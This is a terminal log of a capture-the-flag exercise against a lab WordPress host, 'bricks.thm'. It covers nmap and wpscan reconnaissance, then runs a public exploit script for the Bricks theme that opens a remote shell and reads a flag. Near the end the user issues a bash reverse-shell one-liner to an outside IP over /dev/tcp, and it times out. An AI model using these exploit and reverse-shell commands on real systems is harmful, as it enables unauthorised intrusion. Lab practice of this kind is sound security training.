@@ -1,0 +1,1705 @@
+──(kali㉿kali)-[~/Downloads]
+└─$ sudo nano /etc/hosts
+[sudo] password for kali:
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ sudo nmap -A -T5 -s
+cNmap 7.98 ( https://nmap.org )
+Usage: nmap [Scan Type(s)] [Options] {target specification}
+TARGET SPECIFICATION:
+  Can pass hostnames, IP addresses, networks, etc.
+  Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254
+  -iL <inputfilename>: Input from list of hosts/networks
+  -iR <num hosts>: Choose random targets
+  --exclude <host1[,host2][,host3],...>: Exclude hosts/networks
+  --excludefile <exclude_file>: Exclude list from file
+HOST DISCOVERY:
+  -sL: List Scan - simply list targets to scan
+  -sn: Ping Scan - disable port scan
+  -Pn: Treat all hosts as online -- skip host discovery
+  -PS/PA/PU/PY[portlist]: TCP SYN, TCP ACK, UDP or SCTP discovery to given ports
+  -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes
+  -PO[protocol list]: IP Protocol Ping
+  -n/-R: Never do DNS resolution/Always resolve [default: sometimes]
+  --dns-servers <serv1[,serv2],...>: Specify custom DNS servers
+  --system-dns: Use OS's DNS resolver
+  --traceroute: Trace hop path to each host
+SCAN TECHNIQUES:
+  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
+  -sU: UDP Scan
+  -sN/sF/sX: TCP Null, FIN, and Xmas scans
+  --scanflags <flags>: Customize TCP scan flags
+  -sI <zombie host[:probeport]>: Idle scan
+  -sY/sZ: SCTP INIT/COOKIE-ECHO scans
+  -sO: IP protocol scan
+  -b <FTP relay host>: FTP bounce scan
+PORT SPECIFICATION AND SCAN ORDER:
+  -p <port ranges>: Only scan specified ports
+    Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9
+  --exclude-ports <port ranges>: Exclude the specified ports from scanning
+  -F: Fast mode - Scan fewer ports than the default scan
+  -r: Scan ports sequentially - don't randomize
+  --top-ports <number>: Scan <number> most common ports
+  --port-ratio <ratio>: Scan ports more common than <ratio>
+SERVICE/VERSION DETECTION:
+  -sV: Probe open ports to determine service/version info
+  --version-intensity <level>: Set from 0 (light) to 9 (try all probes)
+  --version-light: Limit to most likely probes (intensity 2)
+  --version-all: Try every single probe (intensity 9)
+  --version-trace: Show detailed version scan activity (for debugging)
+SCRIPT SCAN:
+  -sC: equivalent to --script=default
+  --script=<Lua scripts>: <Lua scripts> is a comma separated list of
+           directories, script-files or script-categories
+  --script-args=<n1=v1,[n2=v2,...]>: provide arguments to scripts
+  --script-args-file=filename: provide NSE script args in a file
+  --script-trace: Show all data sent and received
+  --script-updatedb: Update the script database.
+  --script-help=<Lua scripts>: Show help about scripts.
+           <Lua scripts> is a comma-separated list of script-files or
+           script-categories.
+OS DETECTION:
+  -O: Enable OS detection
+  --osscan-limit: Limit OS detection to promising targets
+  --osscan-guess: Guess OS more aggressively
+TIMING AND PERFORMANCE:
+  Options which take <time> are in seconds, or append 'ms' (milliseconds),
+  's' (seconds), 'm' (minutes), or 'h' (hours) to the value (e.g. 30m).
+  -T<0-5>: Set timing template (higher is faster)
+  --min-hostgroup/max-hostgroup <size>: Parallel host scan group sizes
+  --min-parallelism/max-parallelism <numprobes>: Probe parallelization
+  --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout <time>: Specifies
+      probe round trip time.
+  --max-retries <tries>: Caps number of port scan probe retransmissions.
+  --host-timeout <time>: Give up on target after this long
+  --scan-delay/--max-scan-delay <time>: Adjust delay between probes
+  --min-rate <number>: Send packets no slower than <number> per second
+  --max-rate <number>: Send packets no faster than <number> per second
+FIREWALL/IDS EVASION AND SPOOFING:
+  -f; --mtu <val>: fragment packets (optionally w/given MTU)
+  -D <decoy1,decoy2[,ME],...>: Cloak a scan with decoys
+  -S <IP_Address>: Spoof source address
+  -e <iface>: Use specified interface
+  -g/--source-port <portnum>: Use given port number
+  --proxies <url1,[url2],...>: Relay connections through HTTP/SOCKS4 proxies
+  --data <hex string>: Append a custom payload to sent packets
+  --data-string <string>: Append a custom ASCII string to sent packets
+  --data-length <num>: Append random data to sent packets
+  --ip-options <options>: Send packets with specified ip options
+  --ttl <val>: Set IP time-to-live field
+  --spoof-mac <mac address/prefix/vendor name>: Spoof your MAC address
+  --badsum: Send packets with a bogus TCP/UDP/SCTP checksum
+OUTPUT:
+  -oN/-oX/-oS/-oG <file>: Output scan in normal, XML, s|<rIpt kIddi3,
+     and Grepable format, respectively, to the given filename.
+  -oA <basename>: Output in the three major formats at once
+  -v: Increase verbosity level (use -vv or more for greater effect)
+  -d: Increase debugging level (use -dd or more for greater effect)
+  --reason: Display the reason a port is in a particular state
+  --open: Only show open (or possibly open) ports
+  --packet-trace: Show all packets sent and received
+  --iflist: Print host interfaces and routes (for debugging)
+  --append-output: Append to rather than clobber specified output files
+  --resume <filename>: Resume an aborted scan
+  --noninteractive: Disable runtime interactions via keyboard
+  --stylesheet <path/URL>: XSL stylesheet to transform XML output to HTML
+  --webxml: Reference stylesheet from Nmap.Org for more portable XML
+  --no-stylesheet: Prevent associating of XSL stylesheet w/XML output
+MISC:
+  -6: Enable IPv6 scanning
+  -A: Enable OS detection, version detection, script scanning, and traceroute
+  --datadir <dirname>: Specify custom Nmap data file location
+  --send-eth/--send-ip: Send using raw ethernet frames or IP packets
+  --privileged: Assume that the user is fully privileged
+  --unprivileged: Assume the user lacks raw socket privileges
+  -V: Print version number
+  -h: Print this help summary page.
+EXAMPLES:
+  nmap -v -A scanme.nmap.org
+  nmap -v -sn 192.168.0.0/16 10.0.0.0/8
+  nmap -v -iR 10000 -Pn -p 80
+SEE THE MAN PAGE (https://nmap.org/book/man.html) FOR MORE OPTIONS AND EXAMPLES
+An option is required for -s, most common are -sT (tcp scan), -sS (SYN scan), -sF (FIN scan), -sU (UDP scan) and -sn (Ping scan)
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ sudo nmap -A -T5 -sC -sV bricks.thm --top-ports=1000 --output=nmaplog-1.log
+/usr/lib/nmap/nmap: unrecognized option '--output=nmaplog-1.log'
+See the output of nmap -h for a summary of options.
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ sudo nmap -A -T5 -sC -sV bricks.thm --top-ports=1000 --oN nmaplog-1.log
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-13 07:12 -0600
+Nmap scan report for bricks.thm (10.49.147.114)
+Host is up (0.031s latency).
+Not shown: 996 closed tcp ports (reset)
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 f2:3c:46:ed:74:2f:3a:4c:e8:1c:f4:26:80:fc:bb:d5 (RSA)
+|   256 23:6c:cc:32:61:82:75:6c:0e:ba:86:18:19:f6:20:41 (ECDSA)
+|_  256 62:07:d5:73:c2:cf:44:be:ff:ae:6b:8f:c8:cc:10:f9 (ED25519)
+80/tcp   open  http     Python http.server 3.5 - 3.10
+|_http-title: Error response
+|_http-server-header: WebSockify Python/3.8.10
+443/tcp  open  ssl/http Apache httpd
+| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=US
+| Not valid before: 2024-04-02T11:59:14
+|_Not valid after:  2025-04-02T11:59:14
+|_http-title: Brick by Brick
+|_ssl-date: TLS randomness does not represent time
+| http-robots.txt: 1 disallowed entry
+|_/wp-admin/
+|_http-server-header: Apache
+|_http-generator: WordPress 6.5
+| tls-alpn:
+|   h2
+|_  http/1.1
+3306/tcp open  mysql    MySQL (unauthorized)
+Device type: general purpose|phone
+Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (96%), Google Android 10.X|11.X|12.X (93%)
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:google:android:10 cpe:/o:google:android:11 cpe:/o:google:android:12 cpe:/o:linux:linux_kernel:5.4 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:3
+Aggressive OS guesses: Linux 4.15 - 5.19 (96%), Linux 4.15 (96%), Linux 5.4 (96%), Android 10 - 12 (Linux 4.14 - 4.19) (93%), Android 10 - 11 (Linux 4.14) (92%), Android 9 - 10 (Linux 4.9 - 4.14) (92%), Android 12 (Linux 5.4) (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 3 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 53/tcp)
+HOP RTT      ADDRESS
+1   32.61 ms 192.168.128.1
+2   ...
+3   31.00 ms bricks.thm (10.49.147.114)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 31.01 seconds
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ wpscan -url https://bricks.thm --disable-tls-checks
+
+Scan Aborted: invalid option: -url
+Did you mean?  ua
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ wpscan --url https://bricks.thm --disable-tls-checks
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.28
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[i] It seems like you have not updated the database for some time.
+
+zsh: suspended  wpscan --url https://bricks.thm --disable-tls-checks
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ ss
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ wpscan --update
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.28
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[i] Updating the Database ...
+[i] Update completed.
+
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ wpscan --url https://bricks.thm --disable-tls-checks
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.28
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: https://bricks.thm/ [10.49.147.114]
+[+] Started: Sun Sep 13 07:37:50 2026
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: server: Apache
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] robots.txt found: https://bricks.thm/robots.txt
+ | Interesting Entries:
+ |  - /wp-admin/
+ |  - /wp-admin/admin-ajax.php
+ | Found By: Robots Txt (Aggressive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: https://bricks.thm/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: https://bricks.thm/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: https://bricks.thm/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 6.5 identified (Insecure, released on 2024-04-02).
+ | Found By: Rss Generator (Passive Detection)
+ |  - https://bricks.thm/feed/, <generator>https://wordpress.org/?v=6.5</generator>
+ |  - https://bricks.thm/comments/feed/, <generator>https://wordpress.org/?v=6.5</generator>
+
+[+] WordPress theme in use: bricks
+ | Location: https://bricks.thm/wp-content/themes/bricks/
+ | Readme: https://bricks.thm/wp-content/themes/bricks/readme.txt
+ | Style URL: https://bricks.thm/wp-content/themes/bricks/style.css
+ | Style Name: Bricks
+ | Style URI: https://bricksbuilder.io/
+ | Description: Visual website builder for WordPress....
+ | Author: Bricks
+ | Author URI: https://bricksbuilder.io/
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ | Confirmed By: Urls In 404 Page (Passive Detection)
+ |
+ | Version: 1.9.5 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - https://bricks.thm/wp-content/themes/bricks/style.css, Match: 'Version: 1.9.5'
+
+[+] Enumerating All Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:05 <============================================================================> (137 / 137) 100.00% Time: 00:00:05
+
+[i] No Config Backups Found.
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Sun Sep 13 07:38:01 2026
+[+] Requests Done: 170
+[+] Cached Requests: 7
+[+] Data Sent: 41.448 KB
+[+] Data Received: 110.502 KB
+[+] Memory used: 251.348 MB
+[+] Elapsed time: 00:00:11
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ python3 CVE-2024-15600.py --url https://bricks.thm/
+/home/kali/Downloads/CVE-2024-15600.py:21: SyntaxWarning: invalid escape sequence '\ '
+  / ____/ |  / / ____/   |__ \ / __ \__ \/ // /      |__ \ / ____/ ___// __ \/ __ \\
+Traceback (most recent call last):
+  File "/home/kali/Downloads/CVE-2024-15600.py", line 14, in <module>
+    from alive_progress import alive_bar
+ModuleNotFoundError: No module named 'alive_progress'
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ ls
+ ap-south-1-everroveractual-premium.ovpn   CVE-2024-15600.py                            impacket-0.11.0.tar.gz           thm_crocccrew
+ athena                                    cyberpunk2077                                inacave                          THM_DogCat
+ brr                                      'eu-west-3-everroveractual-regular(1).ovpn'   nmaplog-1.log                    thmenv
+ cupp                                      eu-west-3-everroveractual-regular.ovpn       scheme-catcher                   THM__PP
+ curlevro                                  exrex                                        Screenshot_20260909_121035.png   thm__summit.png
+ CVE-2021-26828_ScadaBR_RCE                impacket-0.11.0                              THM_Checkmate
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ source thmenv/bin/activate
+
+┌──(thmenv)─(kali㉿kali)-[~/Downloads]
+└─$ pip install alive_progress
+Collecting alive_progress
+  Downloading alive_progress-3.3.0-py3-none-any.whl.metadata (72 kB)
+Collecting about-time==4.2.1 (from alive_progress)
+  Downloading about_time-4.2.1-py3-none-any.whl.metadata (13 kB)
+Collecting graphemeu==0.7.2 (from alive_progress)
+  Downloading graphemeu-0.7.2-py3-none-any.whl.metadata (7.8 kB)
+Downloading alive_progress-3.3.0-py3-none-any.whl (78 kB)
+Downloading about_time-4.2.1-py3-none-any.whl (13 kB)
+Downloading graphemeu-0.7.2-py3-none-any.whl (22 kB)
+Installing collected packages: graphemeu, about-time, alive_progress
+Successfully installed about-time-4.2.1 alive_progress-3.3.0 graphemeu-0.7.2
+
+┌──(thmenv)─(kali㉿kali)-[~/Downloads]
+└─$ ls
+ ap-south-1-everroveractual-premium.ovpn   CVE-2024-15600.py                            impacket-0.11.0.tar.gz           thm_crocccrew
+ athena                                    cyberpunk2077                                inacave                          THM_DogCat
+ brr                                      'eu-west-3-everroveractual-regular(1).ovpn'   nmaplog-1.log                    thmenv
+ cupp                                      eu-west-3-everroveractual-regular.ovpn       scheme-catcher                   THM__PP
+ curlevro                                  exrex                                        Screenshot_20260909_121035.png   thm__summit.png
+ CVE-2021-26828_ScadaBR_RCE                impacket-0.11.0                              THM_Checkmate
+
+┌──(thmenv)─(kali㉿kali)-[~/Downloads]
+└─$ python3 CVE-2024-15600.py --url https://bricks.thm/
+/home/kali/Downloads/CVE-2024-15600.py:21: SyntaxWarning: invalid escape sequence '\ '
+  / ____/ |  / / ____/   |__ \ / __ \__ \/ // /      |__ \ / ____/ ___// __ \/ __ \\
+Traceback (most recent call last):
+  File "/home/kali/Downloads/CVE-2024-15600.py", line 5, in <module>
+    import requests
+ModuleNotFoundError: No module named 'requests'
+
+┌──(thmenv)─(kali㉿kali)-[~/Downloads]
+└─$ pip install requests
+Collecting requests
+  Downloading requests-2.34.2-py3-none-any.whl.metadata (4.8 kB)
+Requirement already satisfied: charset_normalizer<4,>=2 in ./thmenv/lib/python3.13/site-packages (from requests) (3.5.1)
+Collecting idna<4,>=2.5 (from requests)
+  Downloading idna-3.19-py3-none-any.whl.metadata (9.2 kB)
+Collecting urllib3<3,>=1.26 (from requests)
+  Using cached urllib3-2.7.0-py3-none-any.whl.metadata (6.9 kB)
+Collecting certifi>=2023.5.7 (from requests)
+  Downloading certifi-2026.7.22-py3-none-any.whl.metadata (2.5 kB)
+Downloading requests-2.34.2-py3-none-any.whl (73 kB)
+Downloading idna-3.19-py3-none-any.whl (68 kB)
+Using cached urllib3-2.7.0-py3-none-any.whl (131 kB)
+Downloading certifi-2026.7.22-py3-none-any.whl (136 kB)
+Installing collected packages: urllib3, idna, certifi, requests
+Successfully installed certifi-2026.7.22 idna-3.19 requests-2.34.2 urllib3-2.7.0
+
+┌──(thmenv)─(kali㉿kali)-[~/Downloads]
+└─$ python3 CVE-2024-15600.py --url https://bricks.thm/
+/home/kali/Downloads/CVE-2024-15600.py:21: SyntaxWarning: invalid escape sequence '\ '
+  / ____/ |  / / ____/   |__ \ / __ \__ \/ // /      |__ \ / ____/ ___// __ \/ __ \\
+Traceback (most recent call last):
+  File "/home/kali/Downloads/CVE-2024-15600.py", line 8, in <module>
+    from bs4 import BeautifulSoup
+ModuleNotFoundError: No module named 'bs4'
+
+┌──(thmenv)─(kali㉿kali)-[~/Downloads]
+└─$ pip install bs4
+Collecting bs4
+  Downloading bs4-0.0.2-py2.py3-none-any.whl.metadata (411 bytes)
+Collecting beautifulsoup4 (from bs4)
+  Downloading beautifulsoup4-4.15.0-py3-none-any.whl.metadata (3.8 kB)
+Collecting soupsieve>=1.6.1 (from beautifulsoup4->bs4)
+  Downloading soupsieve-2.9.2-py3-none-any.whl.metadata (4.6 kB)
+Collecting typing-extensions>=4.0.0 (from beautifulsoup4->bs4)
+  Downloading typing_extensions-4.16.0-py3-none-any.whl.metadata (3.3 kB)
+Downloading bs4-0.0.2-py2.py3-none-any.whl (1.2 kB)
+Downloading beautifulsoup4-4.15.0-py3-none-any.whl (109 kB)
+Downloading soupsieve-2.9.2-py3-none-any.whl (37 kB)
+Downloading typing_extensions-4.16.0-py3-none-any.whl (45 kB)
+Installing collected packages: typing-extensions, soupsieve, beautifulsoup4, bs4
+Successfully installed beautifulsoup4-4.15.0 bs4-0.0.2 soupsieve-2.9.2 typing-extensions-4.16.0
+
+┌──(thmenv)─(kali㉿kali)-[~/Downloads]
+└─$ python3 CVE-2024-15600.py --url https://bricks.thm/
+/home/kali/Downloads/CVE-2024-15600.py:21: SyntaxWarning: invalid escape sequence '\ '
+  / ____/ |  / / ____/   |__ \ / __ \__ \/ // /      |__ \ / ____/ ___// __ \/ __ \\
+Traceback (most recent call last):
+  File "/home/kali/Downloads/CVE-2024-15600.py", line 9, in <module>
+    from rich.console import Console
+ModuleNotFoundError: No module named 'rich'
+
+┌──(thmenv)─(kali㉿kali)-[~/Downloads]
+└─$ pip install rich
+Collecting rich
+  Downloading rich-15.0.0-py3-none-any.whl.metadata (18 kB)
+Collecting markdown-it-py>=2.2.0 (from rich)
+  Downloading markdown_it_py-4.2.0-py3-none-any.whl.metadata (7.4 kB)
+Collecting pygments<3.0.0,>=2.13.0 (from rich)
+  Downloading pygments-2.21.0-py3-none-any.whl.metadata (2.5 kB)
+Collecting mdurl~=0.1 (from markdown-it-py>=2.2.0->rich)
+  Downloading mdurl-0.1.2-py3-none-any.whl.metadata (1.6 kB)
+Downloading rich-15.0.0-py3-none-any.whl (310 kB)
+Downloading pygments-2.21.0-py3-none-any.whl (1.3 MB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.3/1.3 MB 32.8 MB/s  0:00:00
+Downloading markdown_it_py-4.2.0-py3-none-any.whl (91 kB)
+Downloading mdurl-0.1.2-py3-none-any.whl (10.0 kB)
+Installing collected packages: pygments, mdurl, markdown-it-py, rich
+Successfully installed markdown-it-py-4.2.0 mdurl-0.1.2 pygments-2.21.0 rich-15.0.0
+
+┌──(thmenv)─(kali㉿kali)-[~/Downloads]
+└─$ python3 CVE-2024-15600.py --url https://bricks.thm/
+/home/kali/Downloads/CVE-2024-15600.py:21: SyntaxWarning: invalid escape sequence '\ '
+  / ____/ |  / / ____/   |__ \ / __ \__ \/ // /      |__ \ / ____/ ___// __ \/ __ \\
+Traceback (most recent call last):
+  File "/home/kali/Downloads/CVE-2024-15600.py", line 10, in <module>
+    from prompt_toolkit import PromptSession, HTML
+ModuleNotFoundError: No module named 'prompt_toolkit'
+
+┌──(thmenv)─(kali㉿kali)-[~/Downloads]
+└─$ pip install prompt_toolkit
+Collecting prompt_toolkit
+  Downloading prompt_toolkit-3.0.53-py3-none-any.whl.metadata (6.4 kB)
+Collecting wcwidth>=0.1.4 (from prompt_toolkit)
+  Downloading wcwidth-0.8.3-py3-none-any.whl.metadata (43 kB)
+Downloading prompt_toolkit-3.0.53-py3-none-any.whl (392 kB)
+Downloading wcwidth-0.8.3-py3-none-any.whl (331 kB)
+Installing collected packages: wcwidth, prompt_toolkit
+Successfully installed prompt_toolkit-3.0.53 wcwidth-0.8.3
+
+┌──(thmenv)─(kali㉿kali)-[~/Downloads]
+└─$ python3 CVE-2024-15600.py --url https://bricks.thm/
+/home/kali/Downloads/CVE-2024-15600.py:21: SyntaxWarning: invalid escape sequence '\ '
+  / ____/ |  / / ____/   |__ \ / __ \__ \/ // /      |__ \ / ____/ ___// __ \/ __ \\
+
+   _______    ________    ___   ____ ___  __ __       ___   ___________ ____  ____
+  / ____/ |  / / ____/   |__ \ / __ \__ \/ // /      |__ \ / ____/ ___// __ \/ __ \
+ / /    | | / / __/________/ // / / /_/ / // /_________/ //___ \/ __ \/ / / / / / /
+/ /___  | |/ / /__/_____/ __// /_/ / __/__  __/_____/ __/____/ / /_/ / /_/ / /_/ /
+\____/  |___/_____/    /____/\____/____/ /_/       /____/_____/\____/\____/\____/
+
+Coded By: K3ysTr0K3R --> Hello, Friend!
+
+[*] Checking if the target is vulnerable
+[+] The target is vulnerable
+[*] Initiating exploit against: https://bricks.thm/
+[*] Initiating interactive shell
+[+] Interactive shell opened successfully
+Shell> ls
+650c844110baced87e1606453b93f22a.txt
+index.php
+kod
+license.txt
+phpmyadmin
+readme.html
+wp-activate.php
+wp-admin
+wp-blog-header.php
+wp-comments-post.php
+wp-config-sample.php
+wp-config.php
+wp-content
+wp-cron.php
+wp-includes
+wp-links-opml.php
+wp-load.php
+wp-login.php
+wp-mail.php
+wp-settings.php
+wp-signup.php
+wp-trackback.php
+xmlrpc.php
+
+Shell> ls -al
+total 260
+drwxr-xr-x  7 apache apache  4096 Sep 13 13:14 .
+drwxr-xr-x  3 root   root    4096 Apr  2  2024 ..
+-rw-r--r--  1 apache apache   523 Apr  2  2024 .htaccess
+-rw-r--r--  1 root   root      43 Apr  5  2024 650c844110baced87e1606453b93f22a.txt
+-rw-r--r--  1 apache apache   405 Apr  2  2024 index.php
+drwxr-xr-x  7 apache apache  4096 Apr 12  2023 kod
+-rw-r--r--  1 apache apache 19915 Apr  4  2024 license.txt
+drwxr-xr-x 15 apache apache  4096 Apr  2  2024 phpmyadmin
+-rw-r--r--  1 apache apache  7401 Apr  4  2024 readme.html
+-rw-r--r--  1 apache apache  7387 Apr  4  2024 wp-activate.php
+drwxr-xr-x  9 apache apache  4096 Apr  2  2024 wp-admin
+-rw-r--r--  1 apache apache   351 Apr  2  2024 wp-blog-header.php
+-rw-r--r--  1 apache apache  2323 Apr  2  2024 wp-comments-post.php
+-rw-r--r--  1 apache apache  3012 Apr  4  2024 wp-config-sample.php
+-rw-rw-rw-  1 apache apache  3288 Apr  2  2024 wp-config.php
+drwxr-xr-x  6 apache apache  4096 Sep 13 13:14 wp-content
+-rw-r--r--  1 apache apache  5638 Apr  2  2024 wp-cron.php
+drwxr-xr-x 30 apache apache 16384 Apr  4  2024 wp-includes
+-rw-r--r--  1 apache apache  2502 Apr  2  2024 wp-links-opml.php
+-rw-r--r--  1 apache apache  3927 Apr  2  2024 wp-load.php
+-rw-r--r--  1 apache apache 50917 Apr  4  2024 wp-login.php
+-rw-r--r--  1 apache apache  8525 Apr  2  2024 wp-mail.php
+-rw-r--r--  1 apache apache 28427 Apr  4  2024 wp-settings.php
+-rw-r--r--  1 apache apache 34385 Apr  2  2024 wp-signup.php
+-rw-r--r--  1 apache apache  4885 Apr  2  2024 wp-trackback.php
+-rw-r--r--  1 apache apache  3246 Apr  4  2024 xmlrpc.php
+
+Shell> pwd
+/data/www/default
+
+Shell> cd ../web
+
+Deprecated: Exception::__construct(): Passing null to parameter #1 ($message) of type string is deprecated in /data/www/default/wp-content/themes/bricks/includes/elements/code.php(174) : eval()'d code on line 1
+
+Shell> pwd
+/data/www/default
+
+Shell> cd ..
+
+Deprecated: Exception::__construct(): Passing null to parameter #1 ($message) of type string is deprecated in /data/www/default/wp-content/themes/bricks/includes/elements/code.php(174) : eval()'d code on line 1
+
+Shell> cat 650c844110baced87e1606453b93f22a.txt
+THM{fl46_650c844110baced87e1606453b93f22a}
+
+Shell> bash -c 'exec bash -i &>/dev/tcp/192.168.137.110/9586 <&1'
+Traceback (most recent call last):
+  File "/home/kali/Downloads/thmenv/lib/python3.13/site-packages/urllib3/connectionpool.py", line 534, in _make_request
+    response = conn.getresponse()
+  File "/home/kali/Downloads/thmenv/lib/python3.13/site-packages/urllib3/connection.py", line 571, in getresponse
+    httplib_response = super().getresponse()
+  File "/usr/lib/python3.13/http/client.py", line 1450, in getresponse
+    response.begin()
+    ~~~~~~~~~~~~~~^^
+  File "/usr/lib/python3.13/http/client.py", line 336, in begin
+    version, status, reason = self._read_status()
+                              ~~~~~~~~~~~~~~~~~^^
+  File "/usr/lib/python3.13/http/client.py", line 297, in _read_status
+    line = str(self.fp.readline(_MAXLINE + 1), "iso-8859-1")
+               ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^
+  File "/usr/lib/python3.13/socket.py", line 719, in readinto
+    return self._sock.recv_into(b)
+           ~~~~~~~~~~~~~~~~~~~~^^^
+  File "/usr/lib/python3.13/ssl.py", line 1304, in recv_into
+    return self.read(nbytes, buffer)
+           ~~~~~~~~~^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.13/ssl.py", line 1138, in read
+    return self._sslobj.read(len, buffer)
+           ~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^
+TimeoutError: The read operation timed out
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/home/kali/Downloads/thmenv/lib/python3.13/site-packages/requests/adapters.py", line 696, in send
+    resp = conn.urlopen(
+        method=request.method,
+    ...<9 lines>...
+        chunked=chunked,
+    )
+  File "/home/kali/Downloads/thmenv/lib/python3.13/site-packages/urllib3/connectionpool.py", line 842, in urlopen
+    retries = retries.increment(
+        method, url, error=new_e, _pool=self, _stacktrace=sys.exc_info()[2]
+    )
+  File "/home/kali/Downloads/thmenv/lib/python3.13/site-packages/urllib3/util/retry.py", line 498, in increment
+    raise reraise(type(error), error, _stacktrace)
+          ~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/kali/Downloads/thmenv/lib/python3.13/site-packages/urllib3/util/util.py", line 39, in reraise
+    raise value
+  File "/home/kali/Downloads/thmenv/lib/python3.13/site-packages/urllib3/connectionpool.py", line 788, in urlopen
+    response = self._make_request(
+        conn,
+    ...<10 lines>...
+        **response_kw,
+    )
+  File "/home/kali/Downloads/thmenv/lib/python3.13/site-packages/urllib3/connectionpool.py", line 536, in _make_request
+    self._raise_timeout(err=e, url=url, timeout_value=read_timeout)
+    ~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/kali/Downloads/thmenv/lib/python3.13/site-packages/urllib3/connectionpool.py", line 367, in _raise_timeout
+    raise ReadTimeoutError(
+        self, url, f"Read timed out. (read timeout={timeout_value})"
+    ) from err
+urllib3.exceptions.ReadTimeoutError: HTTPSConnectionPool(host='bricks.thm', port=443): Read timed out. (read timeout=10)
+
+During handling of the above exception, another exception occurred:
+
